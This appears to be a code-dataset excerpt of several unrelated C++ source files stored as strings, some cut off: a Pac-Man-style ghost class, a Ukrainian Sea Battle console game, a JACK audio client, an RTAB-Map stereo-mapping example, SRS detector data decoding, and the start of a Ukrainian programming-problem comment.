    "#include \"Fantasma.h\"\n#include <cmath>\n\nFantasma::Fantasma(float speed, float startX, float startY, int colorR, int colorG, int colorB)\n    : posX(startX), posY(startY), speed(speed), directionX(1.0f), directionY(0.0f),\n      colorR(colorR), colorG(colorG), colorB(colorB) {\n    std::srand(std::time(0)); // Inicializar la semilla para generar n\u00fameros aleatorios\n}\n\nvoid Fantasma::draw() {\n    glPushMatrix();\n    float size = 4.0f;\n    glTranslatef(posX, posY, 0.0f);\n    glBegin(GL_QUADS);\n    glColor3ub(colorR, colorG, colorB);\n    glVertex2f(-size/2, -size/2);\n    glVertex2f(size/2, -size/2);\n    glVertex2f(size/2, size/2);\n    glVertex2f(-size/2, size/2);\n    glEnd();\n    glPopMatrix();\n}\n\n\nvoid Fantasma::update(int MC[][21], int filas, int columnas, float cellSize) {\n    float oldX = posX;\n    float oldY = posY;\n\n    posX += directionX * speed;\n    posY += directionY * speed;\n\n    int centerCellX = static_cast<int>((posX) / cellSize);\n    int centerCellY = filas - static_cast<int>((posY) / cellSize) - 1;\n\n    int cellX = static_cast<int>(posX / cellSize);\n    int cellY = filas - static_cast<int>(posY / cellSize) - 1;\n\n    if (directionX < 0) {\n        int leftCellX = static_cast<int>((posX - 2.0f) / cellSize);\n        if (leftCellX >= 0 && leftCellX < columnas && cellY >= 0 && cellY < filas && MC[cellY][leftCellX] == 1) {\n            posX = oldX;\n            directionX = 0.0f;\n            directionY = (rand() % 2 == 0) ? 1.0f : -1.0f;\n        }\n    } else if (directionX > 0) {\n        int rightCellX = static_cast<int>((posX + 2.0f) / cellSize);\n        if (rightCellX >= 0 && rightCellX < columnas && cellY >= 0 && cellY < filas && MC[cellY][rightCellX] == 1) {\n            posX = oldX;\n            directionX = 0.0f;\n            directionY = (rand() % 2 == 0) ? 1.0f : -1.0f;\n        }\n    }\n\n    if (directionY < 0) {\n        int bottomCellY = filas - static_cast<int>((posY - 2.0f) / cellSize) - 1;\n        if (cellX >= 0 && cellX < columnas && bottomCellY >= 0 && bottomCellY < filas && MC[bottomCellY][cellX] == 1) {\n            posY = oldY;\n            directionY = 0.0f;\n            directionX = (rand() % 2 == 0) ? 1.0f : -1.0f;\n        }\n    } else if (directionY > 0) {\n        int topCellY = filas - static_cast<int>((posY + 2.0f) / cellSize) - 1;\n        if (cellX >= 0 && cellX < columnas && topCellY >= 0 && topCellY < filas && MC[topCellY][cellX] == 1) {\n            posY = oldY;\n            directionY = 0.0f;\n            directionX = (rand() % 2 == 0) ? 1.0f : -1.0f;\n        }\n    }\n}\n\n",
    "/* SeaBattleProject.cpp\r\n\u0420\u0435\u0430\u043b\u0456\u0437\u0430\u0446\u0456\u044f \u0433\u0440\u0438 \"\u041c\u043e\u0440\u0441\u044c\u043a\u0438\u0439 \u0431\u0456\u0439\".\r\n\u0412\u0438\u043a\u043e\u043d\u0430\u0432 \u041b\u0435\u0432\u0456\u0446\u044c\u043a\u0438\u0439 \u0412\u0456\u043a\u0442\u043e\u0440 \u0412\u0456\u043a\u0442\u043e\u0440\u043e\u0432\u0438\u0447.\r\n\u0413\u0440\u0443\u043f\u0430 \u041a\u043e\u043c\u043f'\u044e\u0442\u0435\u0440\u043d\u0430 \u043c\u0430\u0442\u0435\u043c\u0430\u0442\u0438\u043a\u0430 - 2, 2-\u0439 \u043a\u0443\u0440\u0441, 2021-\u0439 \u0440\u0456\u043a.\r\n\u0414\u0430\u0442\u0430 \u0432\u0438\u043a\u043e\u043d\u0430\u043d\u043d\u044f 10.11.2021 \r\n*/\r\n\r\n\r\n#include <iostream>\r\n#include \"windows.h\"\r\n#include <stdlib.h>\r\n#include \"ctime\"\r\n#include \"cmath\"\r\nusing namespace std;\r\n\r\n\r\n//\u0424\u0443\u043d\u043a\u0446\u0456\u044f \u0434\u043b\u044f \u043f\u0435\u0440\u0435\u0432\u0435\u0434\u0435\u043d\u043d\u044f \u043b\u0456\u0442\u0435\u0440\u0438 \u0432 \u043a\u043e\u043e\u0440\u0434\u0438\u043d\u0430\u0442\u0443\r\nint prepare(string letter){\r\n    int num ;\r\n    if (letter == \"A\"||letter  == \"a\") {num =1;}else{\r\n    if (letter == \"B\"||letter  == \"b\") {num =2;}else{\r\n    if (letter == \"C\"||letter  == \"c\") {num =3;}else{\r\n    if (letter == \"D\"||letter  == \"d\") {num =4;}else{\r\n    if (letter == \"E\"||letter  == \"e\") {num =5;}else{\r\n    if (letter == \"F\"||letter  == \"f\") {num =6;}else{\r\n    if (letter == \"G\"||letter  == \"g\") {num =7;}else{\r\n    if (letter == \"H\"||letter  == \"h\") {num =8;}else{\r\n    if (letter == \"I\"||letter  == \"i\") {num =9;}else{\r\n    if (letter == \"J\"||letter  == \"j\") {num =10;}\r\n    else{num = 100;}}}}}}}}}}\r\n    return num;\r\n\r\n\r\n}\r\n\r\n//\u0424\u0443\u043d\u043a\u0446\u0456\u044f \u0434\u043b\u044f \u043f\u0435\u0440\u0435\u0432\u0456\u0440\u043a\u0438 \u043a\u043e\u043e\u0440\u0434\u0438\u043d\u0430\u0442\u0438 \u0437\u0430\u0434\u0430\u043d\u043e\u0457 \u043b\u0456\u0442\u0435\u0440\u043e\u044e\r\nbool is_letter_normal(int n){\r\n        bool is_true ;\r\n        if (n==100 || n ==0){\r\n            is_true = false;\r\n        }else{is_true= true;}\r\n    return is_true;\r\n}\r\n\r\n//\u0424\u0443\u043d\u043a\u0446\u0456\u044f \u0434\u043b\u044f \u043f\u0435\u0440\u0435\u0432\u0456\u0440\u043a\u0438 \u0447\u0438 \u043d\u0435 \u0432\u0438\u0445\u043e\u0434\u0438\u0442\u044c \u043a\u043e\u043e\u0440\u0434\u0438\u043d\u0430\u0442\u0430 \u0437\u0430 \u043c\u0435\u0436\u0456\r\nbool is_number_normal(int n){\r\n    bool is_true;\r\n    if (n>11||n<1||n==0){\r\n        is_true= false;\r\n        return is_true;\r\n    }\r\n    else{is_true= true;\r\n        return is_true;}\r\n\r\n\r\n}\r\n\r\n//\u0424\u0443\u043d\u043a\u0446\u0456\u044f \u0434\u043b\u044f \u043f\u0435\u0440\u0435\u0432\u0435\u0434\u0435\u043d\u043d\u044f \u043a\u043e\u043e\u0440\u0434\u0438\u043d\u0430\u0442\u0438 \u0432 \u043b\u0456\u0442\u0435\u0440\u0443\r\nstring number_to_letter(int number){\r\n    string letter;\r\n    if (number== 1){letter = \"A\";}\r\n    if (number== 2){letter = \"B\";}\r\n    if (number== 3){letter = \"C\";}\r\n    if (number== 4){letter = \"D\";}\r\n    if (number== 5){letter = \"E\";}\r\n    if (number== 6){letter = \"F\";}\r\n    if (number== 7){letter = \"G\";}\r\n    if (number== 8){letter = \"H\";}\r\n    if (number== 9){letter = \"I\";}\r\n    if (number== 10){letter = \"J\";}\r\n    return letter;\r\n\r\n}\r\n\r\n//\u0424\u0443\u043d\u043a\u0446\u0456\u044f \u0434\u043b\u044f \u043f\u0435\u0440\u0435\u0432\u0456\u0440\u043a\u0438 \u0447\u0438 \u043d\u0435 \u043c\u043e\u0436\u043d\u0430 \u0456\u0442\u0438/\u0441\u0442\u0440\u0456\u043b\u044f\u0442\u0438 \u043d\u0430 \u0437\u0430\u0434\u0430\u043d\u0443 \u043a\u043e\u043e\u0440\u0434\u0438\u043d\u0430\u0442\u0443\r\nbool position_is_locked(int num,int let,string Pole[11][11]){\r\n    if(Pole[num][let] ==\"1\"||Pole[num][let] ==\"<\"||Pole[num][let] ==\">\"){\r\n        return true;\r\n    }else{\r\n        return false;\r\n    }\r\n}\r\n\r\n//\u0424\u0443\u043d\u043a\u0446\u0456\u044f \u0434\u043b\u044f \u043f\u0435\u0440\u0435\u0432\u0456\u0440\u043a\u0438 \u0441\u043f\u0456\u0432\u043f\u0430\u0434\u0456\u043d\u043d\u044f \u043a\u043e\u043e\u0440\u0434\u0438\u043d\u0430\u0442\r\nbool equal_or_no(int num,int let,int pos[2]){\r\n    int massive[2];\r\n    massive[0]=num;\r\n    massive[1]=let;\r\n    if (pos[0]== massive[0] && pos[1]==massive[1]){\r\n        return false;\r\n    }\r\n    else{return true;}\r\n}\r\n\r\nint main(){\r\n    srand(time (0));\r\n    string Pole_1[11][11];\r\n    string Pole_2[11][11];\r\n    string Pole_1_zapiska[11][11];\r\n    string Pole_2_zapiska[11][11];\r\n    int pozition_p_1[2];\r\n    int pozition_p_2[2];\r\n\r\n    Pole_1[0][0] = \"  \";\r\n    Pole_1[0][1] = \"A\";Pole_1[1][0] = \"1 \";\r\n    Pole_1[0][2] = \"B\";Pole_1[2][0] = \"2 \";\r\n    Pole_1[0][3] = \"C\";Pole_1[3][0] = \"3 \";\r\n    Pole_1[0][4] = \"D\";Pole_1[4][0] = \"4 \";\r\n    Pole_1[0][5] = \"E\";Pole_1[5][0] = \"5 \";\r\n    Pole_1[0][6] = \"F\";Pole_1[6][0] = \"6 \";\r\n    Pole_1[0][7] = \"G\";Pole_1[7][0] = \"7 \";\r\n    Pole_1[0][8] = \"H\";Pole_1[8][0] = \"8 \";\r\n    Pole_1[0][9] = \"I\";Pole_1[9][0] = \"9 \";\r\n    Pole_1[0][10] = \"J\";Pole_1[10][0] = \"10\";\r\n\r\n    Pole_2[0][0] = \"  \";\r\n    Pole_2[0][1] = \"A\";Pole_2[1][0] = \"1 \";\r\n    Pole_2[0][2] = \"B\";Pole_2[2][0] = \"2 \";\r\n    Pole_2[0][3] = \"C\";Pole_2[3][0] = \"3 \";\r\n    Pole_2[0][4] = \"D\";Pole_2[4][0] = \"4 \";\r\n    Pole_2[0][5] = \"E\";Pole_2[5][0] = \"5 \";\r\n    Pole_2[0][6] = \"F\";Pole_2[6][0] = \"6 \";\r\n    Pole_2[0][7] = \"G\";Pole_2[7][0] = \"7 \";\r\n    Pole_2[0][8] = \"H\";Pole_2[8][0] = \"8 \";\r\n    Pole_2[0][9] = \"I\";Pole_2[9][0] = \"9 \";\r\n    Pole_2[0][10] = \"J\";Pole_2[10][0] = \"10\";\r\n\r\n    Pole_1_zapiska[0][0] = \"  \";\r\n    Pole_1_zapiska[0][1] = \"A\";Pole_1_zapiska[1][0] = \"1 \";\r\n    Pole_1_zapiska[0][2] = \"B\";Pole_1_zapiska[2][0] = \"2 \";\r\n    Pole_1_zapiska[0][3] = \"C\";Pole_1_zapiska[3][0] = \"3 \";\r\n    Pole_1_zapiska[0][4] = \"D\";Pole_1_zapiska[4][0] = \"4 \";\r\n    Pole_1_zapiska[0][5] = \"E\";Pole_1_zapiska[5][0] = \"5 \";\r\n    Pole_1_zapiska[0][6] = \"F\";Pole_1_zapiska[6][0] = \"6 \";\r\n    Pole_1_zapiska[0][7] = \"G\";Pole_1_zapiska[7][0] = \"7 \";\r\n    Pole_1_zapiska[0][8] = \"H\";Pole_1_zapiska[8][0] = \"8 \";\r\n    Pole_1_zapiska[0][9] = \"I\";Pole_1_zapiska[9][0] = \"9 \";\r\n    Pole_1_zapiska[0][10] = \"J\";Pole_1_zapiska[10][0] = \"10\";\r\n\r\n    Pole_2_zapiska[0][0] = \"  \";\r\n    Pole_2_zapiska[0][1] = \"A\";Pole_2_zapiska[1][0] = \"1 \";\r\n    Pole_2_zapiska[0][2] = \"B\";Pole_2_zapiska[2][0] = \"2 \";\r\n    Pole_2_zapiska[0][3] = \"C\";Pole_2_zapiska[3][0] = \"3 \";\r\n    Pole_2_zapiska[0][4] = \"D\";Pole_2_zapiska[4][0] = \"4 \";\r\n    Pole_2_zapiska[0][5] = \"E\";Pole_2_zapiska[5][0] = \"5 \";\r\n    Pole_2_zapiska[0][6] = \"F\";Pole_2_zapiska[6][0] = \"6 \";\r\n    Pole_2_zapiska[0][7] = \"G\";Pole_2_zapiska[7][0] = \"7 \";\r\n    Pole_2_zapiska[0][8] = \"H\";Pole_2_zapiska[8][0] = \"8 \";\r\n    Pole_2_zapiska[0][9] = \"I\";Pole_2_zapiska[9][0] = \"9 \";\r\n    Pole_2_zapiska[0][10] = \"J\";Pole_2_zapiska[10][0] = \"10\";\r\n\r\n\r",
    "/**\n * jack_client.cpp\n *\n * Copyright (C) 2023-2024  Pablo Alvarado\n * EL5805 Procesamiento Digital de Se\u00f1ales\n * Escuela de Ingenier\u00eda Electr\u00f3nica\n * Tecnol\u00f3gico de Costa Rica\n *\n * All rights reserved.\n *\n * Redistribution and use in source and binary forms, with or without\n * modification, are permitted provided that the following conditions are met:\n *\n * 1. Redistributions of source code must retain the above copyright notice,\n *    this list of conditions and the following disclaimer.\n *\n * 2. Redistributions in binary form must reproduce the above copyright notice,\n *    this list of conditions and the following disclaimer in the documentation\n *    and/or other materials provided with the distribution.\n *\n * 3. Neither the name of the authors nor the names of its contributors may be\n *    used to endorse or promote products derived from this software without\n *    specific prior written permission.\n *\n * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS \"AS IS\"\n * AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE\n * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE\n * ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE\n * LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR\n * CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF\n * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS\n * INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN\n * CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)\n * ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE\n * POSSIBILITY OF SUCH DAMAGE.\n */\n\n#include \"jack_client.h\"\n\n#include <cstdio>\n#include <cerrno>\n#include <cstdlib>\n#include <stdexcept>\n\n#include <mutex>\n#include <iostream>\n\nstd::ostream& operator<<(std::ostream& os,const JackStatus& s) {\n  if (s & JackFailure) {\n    os << \"Failure \";\n  }\n  if (s & JackInvalidOption) {\n    os << \"InvalidOption \";\n  }\n  if (s & JackNameNotUnique) {\n    os << \"NameNotUnique\";\n  }\n  if (s & JackServerStarted) {\n    os << \"ServerStarted\";\n  }\n  if (s & JackServerFailed) {\n    os << \"ServerFailed\";\n  }\n  if (s & JackServerError) {\n    os << \"ServerError\";\n  }\n  if (s & JackNoSuchClient) {\n    os << \"NoSuchClient\";\n  }\n  if (s & JackLoadFailure) {\n    os << \"LoadFailure\";\n  }\n  if (s & JackInitFailure) {\n    os << \"InitFailure\";\n  }\n  if (s & JackShmFailure) {\n    os << \"ShmFailure\";\n  }\n  if (s & JackVersionError) {\n    os << \"VersionError\";\n  }\n\n  return os;\n}\n\n\nnamespace jack {\n\n  // Static member of class client\n  jack_client_t* client::_client_ptr  = 0;\n  client_state   client::_state       = client_state::Idle;\n\n  jack_nframes_t client::_buffer_size = 0;\n  jack_nframes_t client::_sample_rate = 0;\n\n  sndfile_thread client::_file_thread;\n  \n  jack_port_t*   client::_input_port  = nullptr;\n  jack_port_t*   client::_output_port = nullptr;\n\n  \n  /*\n   * C level callback function.  \n   *\n   * There must be an instance of a class inherited from jack::client\n   * with a method \"process\", that will be called from here.  This\n   * method is the one that jack's C API defines.\n   */\n  static int process(jack_nframes_t nframes, void *arg) {\n    client* ptr=static_cast<client*>(arg);\n    \n    typedef jack_default_audio_sample_t sample_t;\n\n    jack_port_t *const ip = ptr->input_port();\n    jack_port_t *const op = ptr->output_port();\n    \n    const sample_t* in\n      = static_cast<const sample_t*>(jack_port_get_buffer(ip,nframes));\n    \n    sample_t *const out\n      = static_cast<sample_t*>(jack_port_get_buffer(op,nframes));\n\n    // Check if we have to replace the input by audio files' input\n    sndfile_thread::file_block* file_block_ptr =\n      ptr->next_file_block();\n    \n    if (file_block_ptr != nullptr) {\n      in = &(file_block_ptr->front());\n    }\n\n    bool ok = ptr->process(nframes,in,out);\n\n    if (file_block_ptr != nullptr) {\n      file_block_ptr->status = sndfile_thread::Status::Garbage;\n    }\n    \n    return ok ? EXIT_SUCCESS : EXIT_FAILURE;\n  }\n\n  // C level callback function, follows jack's C API.\n  static void shutdown(void *arg) {\n    client* ptr=static_cast<client*>(arg);\n    ptr->shutdown();\n  }\n\n  // Callback used to update used sample rate\n  static int sample_rate_changed(jack_nframes_t nframes, void *arg) {\n    client* ptr=static_cast<client*>(arg);\n    ptr->set_sample_rate(nframes);\n    return EXIT_SUCCESS;\n  }\n\n  // Callback used to update used buffer size\n  static int buffer_size_changed(jack_nframes_t nframes, void *arg) {\n    client* ptr=static_cast<client*>(arg);\n    ptr->set_buffer_size(nframes);\n    return EXIT_SUCCESS;\n  }\n  \n\n  client::client() {\n  }\n\n  client::~client() {\n    if (_state != client_state::Idle) {\n      std::cout << \"I> Deactivating and closing JACK client\" << std::endl;\n      jack_deactivate(_client_ptr);\n      jack_client_close(_client_ptr);\n      _client_ptr=nullptr;\n      _state = client_s",
    "/*\r\nCopyright (c) 2010-2016, Mathieu Labbe - IntRoLab - Universite de Sherbrooke\r\nAll rights reserved.\r\n\r\nRedistribution and use in source and binary forms, with or without\r\nmodification, are permitted provided that the following conditions are met:\r\n    * Redistributions of source code must retain the above copyright\r\n      notice, this list of conditions and the following disclaimer.\r\n    * Redistributions in binary form must reproduce the above copyright\r\n      notice, this list of conditions and the following disclaimer in the\r\n      documentation and/or other materials provided with the distribution.\r\n    * Neither the name of the Universite de Sherbrooke nor the\r\n      names of its contributors may be used to endorse or promote products\r\n      derived from this software without specific prior written permission.\r\n\r\nTHIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS \"AS IS\" AND\r\nANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED\r\nWARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE\r\nDISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY\r\nDIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES\r\n(INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;\r\nLOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND\r\nON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT\r\n(INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS\r\nSOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\r\n*/\r\n\r\n#include <rtabmap/core/Rtabmap.h>\r\n#include <rtabmap/core/CameraStereo.h>\r\n#include <rtabmap/utilite/UThread.h>\r\n#include \"MapBuilder.h\"\r\n#include <pcl/visualization/cloud_viewer.h>\r\n#include <rtabmap/core/Odometry.h>\r\n#include <QApplication>\r\n#include <stdio.h>\r\n\r\nusing namespace rtabmap;\r\n\r\nvoid showUsage()\r\n{\r\n\tprintf(\"\\nUsage:\\n\"\r\n\t\t\t\"rtabmap-noEventsExample camera_rate odom_update map_update calibration_dir calibration_name path_left_images path_right_images\\n\"\r\n\t\t\t\"Description:\\n\"\r\n\t\t\t\"    camera_rate          Rate (Hz) of the camera.\\n\"\r\n\t\t\t\"    odom_update          Do odometry update each X camera frames.\\n\"\r\n\t\t\t\"    map_update           Do map update each X odometry frames.\\n\"\r\n\t\t\t\"\\n\"\r\n\t\t\t\"Example:\\n\"\r\n\t\t\t\"     (with images from \\\"https://github.com/introlab/rtabmap/wiki/Stereo-mapping#process-a-directory-of-stereo-images\\\") \\n\"\r\n\t\t\t\"     $ rtabmap-noEventsExample 20 2 10 stereo_20Hz stereo_20Hz stereo_20Hz/left stereo_20Hz/right\\n\"\r\n\t\t\t\"       Camera rate = 20 Hz\\n\"\r\n\t\t\t\"       Odometry update rate = 10 Hz\\n\"\r\n\t\t\t\"       Map update rate = 1 Hz\\n\");\r\n\texit(1);\r\n}\r\n\r\nint main(int argc, char * argv[])\r\n{\r\n\tULogger::setType(ULogger::kTypeConsole);\r\n\tULogger::setLevel(ULogger::kError);\r\n\r\n\tif(argc < 8)\r\n\t{\r\n\t\tshowUsage();\r\n\t}\r\n\r\n\tint argIndex = 1;\r\n\tint cameraRate = atoi(argv[argIndex++]);\r\n\tif(cameraRate <= 0)\r\n\t{\r\n\t\tprintf(\"camera_rate should be > 0\\n\");\r\n\t\tshowUsage();\r\n\t}\r\n\tint odomUpdate = atoi(argv[argIndex++]);\r\n\tif(odomUpdate <= 0)\r\n\t{\r\n\t\tprintf(\"odom_update should be > 0\\n\");\r\n\t\tshowUsage();\r\n\t}\r\n\tint mapUpdate = atoi(argv[argIndex++]);\r\n\tif(mapUpdate <= 0)\r\n\t{\r\n\t\tprintf(\"map_update should be > 0\\n\");\r\n\t\tshowUsage();\r\n\t}\r\n\r\n\tprintf(\"Camera rate = %d Hz\\n\", cameraRate);\r\n\tprintf(\"Odometry update rate = %d Hz\\n\", cameraRate/odomUpdate);\r\n\tprintf(\"Map update rate = %d Hz\\n\", (cameraRate/odomUpdate)/mapUpdate);\r\n\r\n\tstd::string calibrationDir = argv[argIndex++];\r\n\tstd::string calibrationName = argv[argIndex++];\r\n\tstd::string pathLeftImages = argv[argIndex++];\r\n\tstd::string pathRightImages = argv[argIndex++];\r\n\r\n\tCameraStereoImages camera(\r\n\t\t\tpathLeftImages,\r\n\t\t\tpathRightImages,\r\n\t\t\tfalse, // assume that images are already rectified\r\n\t\t\t(float)cameraRate);\r\n\r\n\tif(camera.init(calibrationDir, calibrationName))\r\n\t{\r\n\t\tOdometry * odom = Odometry::create();\r\n\t\tRtabmap rtabmap;\r\n\t\trtabmap.init();\r\n\r\n\t\tQApplication app(argc, argv);\r\n\t\tMapBuilder mapBuilder;\r\n\t\tmapBuilder.show();\r\n\t\tQApplication::processEvents();\r\n\r\n\t\tSensorData data = camera.takeImage();\r\n\t\tint cameraIteration = 0;\r\n\t\tint odometryIteration = 0;\r\n\t\tprintf(\"Press \\\"Space\\\" in the window to pause\\n\");\r\n\t\twhile(data.isValid() && mapBuilder.isVisible())\r\n\t\t{\r\n\t\t\tif(cameraIteration++ % odomUpdate == 0)\r\n\t\t\t{\r\n\t\t\t\tOdometryInfo info;\r\n\t\t\t\tTransform pose = odom->process(data, &info);\r\n\r\n\t\t\t\tif(odometryIteration++ % mapUpdate == 0)\r\n\t\t\t\t{\r\n\t\t\t\t\tif(rtabmap.process(data, pose))\r\n\t\t\t\t\t{\r\n\t\t\t\t\t\tmapBuilder.processStatistics(rtabmap.getStatistics());\r\n\t\t\t\t\t\tif(rtabmap.getLoopClosureId() > 0)\r\n\t\t\t\t\t\t{\r\n\t\t\t\t\t\t\tprintf(\"Loop closure detected!\\n\");\r\n\t\t\t\t\t\t}\r\n\t\t\t\t\t}\r\n\t\t\t\t}\r\n\r\n\t\t\t\tmapBuilder.processOdometry(data, pose, info);\r\n\t\t\t}\r\n\r\n\t\t\tQApplication::processEvents();\r\n\r\n\t\t\twhile(mapBuilder.isPaused() && mapBuilder.isVisible())\r\n\t\t\t{\r\n\t\t\t\tuSleep(100);\r\n\t\t\t\tQApplication::processEvents();\r\n\t\t\t}\r\n\r\n\t\t\tdata = camera.takeImage();\r\n\t\t}\r\n\t\tdelete odom;\r\n\r\n\t\tif(mapBuilder.isVisible())\r\n\t\t{\r\n\t\t\t",
    "#include \"DataStructs.hpp\"\n#include \"CommonDefitions.hpp\"\n#include <bit>\n\nnamespace srs\n{\n    namespace\n    {\n        template <typename T>\n        auto convert_to(const DataElementType& raw_data) -> T\n        {\n            constexpr auto struct_size = sizeof(uint64_t);\n            static_assert(HIT_DATA_BIT_LENGTH <= BYTE_BIT_LENGTH * struct_size);\n            static_assert(sizeof(T) == struct_size);\n            auto expanded_raw_data = std::bitset<BYTE_BIT_LENGTH * struct_size>(raw_data.to_ullong());\n            constexpr auto shifted_bits = struct_size * BYTE_BIT_LENGTH - HIT_DATA_BIT_LENGTH;\n            expanded_raw_data = expanded_raw_data << shifted_bits;\n            return std::bit_cast<T>(expanded_raw_data.to_ullong());\n        }\n    }; // namespace\n    struct HitDataCompact\n    {\n        uint16_t : 16;\n        uint16_t tdc : 8;\n        uint16_t channel_num : 6;\n        uint16_t is_over_threshold : 1;\n        uint16_t flag : 1;\n        uint32_t bc_id : 12;\n        uint32_t adc : 10;\n        uint32_t vmm_id : 5;\n        uint32_t offset : 5;\n    };\n\n    struct MarkerDataCompact\n    {\n        uint16_t : 16;\n        uint16_t timestamp_low_bits : SRS_TIMESTAMP_LOW_BIT_LENGTH;\n        uint16_t vmm_id : 5;\n        uint16_t flag : 1;\n        uint32_t timestamp_high_bits : SRS_TIMESTAMP_HIGH_BIT_LENGTH;\n    };\n\n    MarkerData::MarkerData(const DataElementType& raw_data)\n    {\n        auto marker_data_compact = convert_to<MarkerDataCompact>(raw_data);\n\n        auto timestamp_high_bits =\n            std::bitset<SRS_TIMESTAMP_HIGH_BIT_LENGTH>(static_cast<uint32_t>(marker_data_compact.timestamp_high_bits));\n        auto timestamp_low_bits =\n            std::bitset<SRS_TIMESTAMP_LOW_BIT_LENGTH>(static_cast<uint32_t>(marker_data_compact.timestamp_low_bits));\n        srs_timestamp =\n            static_cast<decltype(srs_timestamp)>(merge_bits(timestamp_high_bits, timestamp_low_bits).to_ullong());\n        vmm_id = static_cast<decltype(vmm_id)>(marker_data_compact.vmm_id);\n    }\n\n    HitData::HitData(const DataElementType& raw_data)\n    {\n        auto hit_data_compact = convert_to<HitDataCompact>(raw_data);\n\n        is_over_threshold = static_cast<decltype(is_over_threshold)>(hit_data_compact.is_over_threshold);\n        channel_num = static_cast<decltype(channel_num)>(hit_data_compact.channel_num);\n        tdc = static_cast<decltype(tdc)>(hit_data_compact.tdc);\n        offset = static_cast<decltype(offset)>(hit_data_compact.offset);\n        vmm_id = static_cast<decltype(vmm_id)>(hit_data_compact.vmm_id);\n        adc = static_cast<decltype(adc)>(hit_data_compact.adc);\n        bc_id = static_cast<decltype(bc_id)>(hit_data_compact.bc_id);\n        bc_id = gray_to_binary(bc_id);\n    }\n\n} // namespace srs\n",
    "/*\u041f\u0440\u043e\u0439\u0448\u043b\u043e 20 \u0440\u043e\u043a\u0456\u0432\u2026 \u041b\u0456\u0442\u043d\u044f \u0448\u043a\u043e\u043b\u0430 \u043f\u0440\u043e\u0433\u0440\u0430\u043c\u0443\u0432\u0430\u043d\u043d\u044f \u0442\u0430 \u0456\u043d\u0444\u043e\u0440\u043c\u0430\u0446\u0456\u0439\u043d\u0438\u0445 \u0442\u0435\u0445\u043d\u043e\u043b\u043e\u0433\u0456\u0439 \u043d\u0430\u0431\u0438\u0440\u0430\u043b\u0430\r\n\u043e\u0431\u0435\u0440\u0442\u0456\u0432. \u0423\u0447\u043d\u0456\u0432, \u0449\u043e \u0431\u0430\u0436\u0430\u044e\u0442\u044c \u043d\u0430\u0432\u0447\u0438\u0442\u0438\u0441\u044f \u043f\u0440\u043e\u0433\u0440\u0430\u043c\u0443\u0432\u0430\u0442\u0438, \u0441\u0442\u0430\u0432\u0430\u043b\u043e \u0432\u0441\u0435 \u0431\u0456\u043b\u044c\u0448\u0435 \u0456 \u0431\u0456\u043b\u044c\u0448\u0435. \u0412\u0436\u0435\r\n\u0432\u0441\u0456 \u043a\u043e\u0440\u043f\u0443\u0441\u0438 \u0434\u0438\u0442\u044f\u0447\u043e\u0433\u043e \u0441\u0430\u043d\u0430\u0442\u043e\u0440\u0456\u044e \u00ab\u0415\u043b\u0435\u043a\u0442\u0440\u043e\u043d\u0456\u043a\u00bb \u0431\u0443\u043b\u0438 \u0437\u0430\u043f\u043e\u0432\u043d\u0435\u043d\u0456 \u0441\u043b\u0443\u0445\u0430\u0447\u0430\u043c\u0438 \u0428\u043a\u043e\u043b\u0438 \u0456 \u0449\u043e\u0431\r\n\u0432\u043c\u0456\u0441\u0442\u0438\u0442\u0438 \u0443\u0441\u0456\u0445 \u0431\u0430\u0436\u0430\u044e\u0447\u0438\u0445, \u043a\u0435\u0440\u0456\u0432\u043d\u0438\u0446\u0442\u0432\u043e \u0428\u043a\u043e\u043b\u0438 \u041f\u0406\u0422 \u0431\u0443\u043b\u043e \u0437\u043c\u0443\u0448\u0435\u043d\u043e \u043e\u0440\u0435\u043d\u0434\u0443\u0432\u0430\u0442\u0438 \u0449\u0435 \u043e\u0434\u0438\u043d\r\n\u0434\u0438\u0442\u044f\u0447\u0438\u0439 \u0442\u0430\u0431\u0456\u0440 \u00ab\u0427\u0430\u0439\u043a\u0430 \u0411\u043e\u0433\u0443\u0441\u043b\u0430\u0432\u00bb\u2026 \u0417\u043c\u0456\u043d\u0430 \u043f\u0440\u043e\u043b\u0435\u0442\u0456\u043b\u0430 \u043d\u0435\u043f\u043e\u043c\u0456\u0442\u043d\u043e \u0456 \u043e\u0441\u044c, \u043d\u0430\u0440\u0435\u0448\u0442\u0456, \u043e\u0441\u0442\u0430\u043d\u043d\u0456\u0439\r\n\u0434\u0435\u043d\u044c. \u0423 \u043a\u043e\u0436\u043d\u043e\u043c\u0443 \u0437 \u0442\u0430\u0431\u043e\u0440\u0456\u0432 \u0443\u0441\u0456 \u0434\u0456\u0442\u0438 \u0432\u0438\u0448\u0438\u043a\u0443\u0432\u0430\u043b\u0438\u0441\u044c \u0432 \u043a\u043e\u043b\u043e\u043d\u043d\u0443 \u0437\u0430 \u0437\u0440\u043e\u0441\u0442\u043e\u043c \u0456 